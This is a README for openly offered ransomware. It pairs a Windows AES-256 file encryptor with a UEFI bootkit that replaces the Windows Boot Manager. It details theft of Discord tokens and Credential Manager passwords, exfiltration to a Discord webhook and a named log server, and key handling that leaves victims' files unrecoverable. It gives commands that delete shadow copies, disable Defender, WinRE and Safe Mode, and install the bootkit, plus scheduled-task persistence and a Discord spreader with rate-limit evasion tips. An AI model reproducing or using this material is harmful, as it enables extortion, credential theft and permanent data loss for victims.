#         OPENSOURCE RANSOMWARE
# - - - - - - - - - - - - - - - - - - - - -

p.s. for the efi headers go to [yoppeh’s efi headers repo](https://github.com/yoppeh/efi)

Overview
A two-component system consisting of a Windows payload that performs AES-256 file encryption and deploys a UEFI pre-boot lock screen. The UEFI module replaces the Windows Boot Manager and requires password authentication before chain-loading the original boot manager.

Project Structure
text
project/
├── main.cpp            # Windows encryption payload
├── efi.dll             # UEFI lock screen source
├── inject.dll          # Compiled UEFI module (renamed from efi.dll)
└── README.md
System Architecture
text
WINDOWS PAYLOAD (main.cpp)
    │
    ├── Data Collection
    │   ├── Discord token extraction (LevelDB + AES-GCM decryption)
    │   ├── Windows Credential Manager dump
    │   ├── IP geolocation (ipapi.co)
    │   └── Public IP via api.ipify.org / checkip.amazonaws.com
    │
    ├── Data Exfiltration
    │   ├── Discord webhook (key, HWID, IP)
    │   └── Log service (credentials, tokens, IP data)
    │
    ├── System Modification
    │   ├── Terminate Windows Defender processes/services
    │   ├── Delete volume shadow copies
    │   ├── Disable WinRE, Safe Mode, UAC
    │   └── Block Microsoft update domains in hosts file
    │
    ├── File Encryption
    │   ├── AES-256 via Windows CryptoAPI
    │   ├── SHA-256 key derivation from 64-char random key
    │   ├── Files renamed to *.locked
    │   └── Excludes system files and payload components
    │
    ├── Bootkit Installation
    │   ├── Mount EFI System Partition
    │   ├── Backup bootmgfw.efi → bootmgfw.windows.efi
    │   └── Replace bootmgfw.efi with inject.dll
    │
    └── System Reboot

UEFI BOOT SEQUENCE (efi.dll / inject.dll)
    │
    ├── Check NVRAM UnlockedFlag
    │   └── If set → Launch Windows Boot Manager immediately
    │
    ├── Display Lock Screen
    │   ├── Read status.txt from ESP (optional)
    │   └── Prompt for password (5 attempts maximum)
    │
    ├── On Success
    │   ├── Set UnlockedFlag = 1 in NVRAM
    │   ├── Delete own boot entry from BootOrder
    │   ├── Self-delete from filesystem
    │   └── Chain-load bootmgfw.windows.efi
    │
    └── On Failure (5 attempts)
        └── Cold reboot after 5-second delay
Component 1: Windows Payload (main.cpp)
Build Requirements
bash
# MSVC or MinGW-w64 required
# Libraries linked via #pragma:
#   wininet.lib     - HTTP requests
#   advapi32.lib    - Registry, encryption
#   crypt32.lib     - AES encryption
#   psapi.lib       - Process enumeration
#   netapi32.lib    - Network management
#   credui.lib      - Credential enumeration
#   shell32.lib     - Shell execution

cl /EHsc /O2 main.cpp /Fe:main.exe
Dependencies
Python 3.x with pycryptodome, win32crypt, requests packages

Administrator privileges

inject.dll in the same directory as the executable

Encryption System
Key Generation
The encryption key is a 64-character string generated from a set of 88 possible characters (A-Z, a-z, 0-9, and special characters). Generation uses std::random_device for entropy seeding and Mersenne Twister 19937 (std::mt19937) as the PRNG, producing approximately 2^412 possible combinations.

cpp
std::string GenerateRandomKey() {
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                         "abcdefghijklmnopqrstuvwxyz"
                         "0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(chars) - 2);
    
    std::string key;
    for (int i = 0; i < 64; i++) key += chars[dis(gen)];
    return key;
}
AES-256 Encryption Process
Files are encrypted using Windows CryptoAPI with the following pipeline:

Read entire file as binary data

Acquire cryptographic context (PROV_RSA_AES)

Create SHA-256 hash of the 64-character key

Derive AES-256 key from hash (CALG_AES_256)

Encrypt data in-place with CBC mode and PKCS#7 padding

Write encrypted data to original_filename.ext.locked

Delete original file

Files excluded from encryption:

Already encrypted files (*.locked)

Decryptor tool (DECRYPT_ME*)

Payload and UEFI module (run.exe, inject.dll)

System directories (System32, syswow64, boot)

Critical system files (ntldr, winload, winlogon, kernel)

Decryption
The DECRYPT_ME.bat file generated on the Desktop performs a simple rename operation that removes the .locked extension. This is a placeholder mechanism and does not perform actual AES decryption. Proper decryption requires the original 64-character key and CryptDecrypt() with the same AES-256 parameters.

Key Storage
After encryption completes, the key is intentionally cleared from process memory:

cpp
g_key.clear();
g_key = "";
The key exists only in the Discord webhook message sent to the attacker. It is not stored on the target system. Loss of this key results in permanent file encryption.

HWID System
The Hardware ID is a composite identifier generated at runtime:

text
Format: [seconds_since_midnight]-[12_random_chars]-[desktop_name]
Example: [42815]-[K7MXP9Q4VN2B]-[WinSta0\Default]
Components:

Component	Source	Example
Time	localtime_s() - seconds elapsed since midnight (0-86399)	42815
Random	std::mt19937 - 12 characters from A-Z, 0-9	K7MXP9Q4VN2B
Desktop	GetUserObjectInformationA() - Window station name	WinSta0\Default
HWID transmission points:

Console output during execution

Discord webhook (bundled with encryption key and IP)

EFI System Partition (\EFI\Microsoft\Boot\config\hwid.txt)

Embedded in DECRYPT_ME.bat for victim reference

Data Exfiltration
Discord Webhook
Format sent to attacker's Discord channel:

text
HWID: [42815]-[K7MXP9Q4VN2B]-[WinSta0\Default] | KEY: ```aB3$xK9...``` | IPv4: 203.0.113.42
Large data payloads are chunked at 1900 characters with 500ms delays between messages.

Log Service
Credentials, tokens, and IP data are sent to python-vxgd.onrender.com/log with header X-API-Key authentication. Format:

text
username:password:IPv4:IPv4Bypass:token:email:website:IPv6
NOusername:NOpassword:IPv4:IPv4Bypass:token:NOemail:NOwebsite:IPv6
Collected Data Types
Discord tokens from local LevelDB storage (decrypted via AES-GCM)

Discord tokens from spreader (extracted from Chrome LevelDB)

Windows Credential Manager entries (username and password)

GPS coordinates, city, country (via ipapi.co/json/)

Public IPv4 (via api.ipify.org)

Public IPv4 bypass (via checkip.amazonaws.com)

Public IPv6 (via api6.ipify.org)

Google Maps link with coordinates

Discord Spreader
Extracts a valid Discord token, retrieves the friend list, and sends a message to each friend.

Rate Limiting Warning: The default delay of 2.0 seconds between messages is insufficient and will trigger Discord rate limits, likely resulting in account restriction or termination. A delay of 10-15 seconds between messages is the minimum safe threshold. For accounts with large friend lists, increase to 30 seconds.

python
# To modify, locate in the embedded Python script:
send_message_to_user(working_token, int(friend_id), "hi", delay=2.0)
# Change to:
send_message_to_user(working_token, int(friend_id), "hi", delay=15.0)
Component 2: UEFI Module (efi.dll / inject.dll)
Build Requirements
Compiled as a Dynamic Link Library targeting UEFI x64:

bash
# Requires EDK2 or GNU-EFI development environment
build -p AppPkg/AppPkg.dsc -a X64 -t VS2019
Default Password
The registry password is hardcoded as ADMIN and can be modified in source:

c
// In efi_main(), locate and change:
static CHAR16 AdminPassword[] = { 'A','D','M','I','N', 0 };

// Example replacement:
static CHAR16 AdminPassword[] = { 'N','E','W','P','A','S','S', 0 };
NVRAM Variables
Variable	GUID	Type	Description
UnlockedFlag	Custom (12345678-1234-1234-...)	UINT64	Lock state: 0 = locked, 1 = unlocked
Attributes: NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS

Boot Flow Detail
Clear screen and check UnlockedFlag NVRAM variable

If already set to 1, skip to Windows Boot Manager launch

Read \EFI\Microsoft\Boot\config\status.txt from ESP

Content FULL displays "works perfectly"

Any other content displays "works"

Display lock screen header and password prompt

Accept up to 5 password attempts

Correct: Set UnlockedFlag = 1, proceed to cleanup

Incorrect: Decrement counter, display remaining attempts

Exhausted: 5-second countdown, then cold reboot

Cleanup operations:

Find and delete current boot entry from BootOrder

Self-delete EFI file from filesystem

Load and start bootmgfw.windows.efi (original Windows Boot Manager)

On failure at any stage: cold reboot

Self-Cleanup Mechanism
The module removes itself by:

Identifying its boot entry via device path matching against Boot#### variables

Removing the entry from the BootOrder list

Deleting the entry's Boot#### variable

Deleting the EFI file from the filesystem using the file protocol

Deployment
Installation
The InstallBootloader() function handles ESP modification:

cpp
mountvol S: /S                                          // Mount ESP
copy S:\EFI\Microsoft\Boot\bootmgfw.efi \
     S:\EFI\Microsoft\Boot\bootmgfw.windows.efi         // Backup original
copy inject.dll S:\EFI\Microsoft\Boot\bootmgfw.efi      // Install lock screen
mountvol S: /D                                          // Unmount
Optional Configuration
Create \EFI\Microsoft\Boot\config\status.txt on the ESP to control lock screen behavior.

System Modifications
Persistence
Two scheduled tasks are created:

SystemUpdateTask - triggers on user logon

MicrosoftWindowsUpdate - triggers daily at 09:00

Both run as SYSTEM with highest privileges.

Recovery Prevention
Target	Method
Shadow Copies	vssadmin delete shadows /all /quiet
WinRE	reagentc /disable
Safe Mode	Registry key deletion and DisableSafeBoot policy
UAC	EnableLUA=0, ConsentPromptBehaviorAdmin=0
Task Manager	DisableTaskMgr=1 policy
Registry Editor	DisableRegistryTools=1 policy
Windows Defender	Process termination, service disabled, tamper protection bypass
Windows Update	Microsoft domains blocked in hosts file
Backup Services	SDRSVC, wbengine, wscsvc disabled

License
[CC BY-NC-ND 4.0]([https://yourlink.com](https://creativecommons.org/licenses/by-nc-nd/4.0/)

This software is provided for educational and research purposes only. Unauthorized deployment against systems without explicit permission is illegal. The authors assume no liability for misuse.
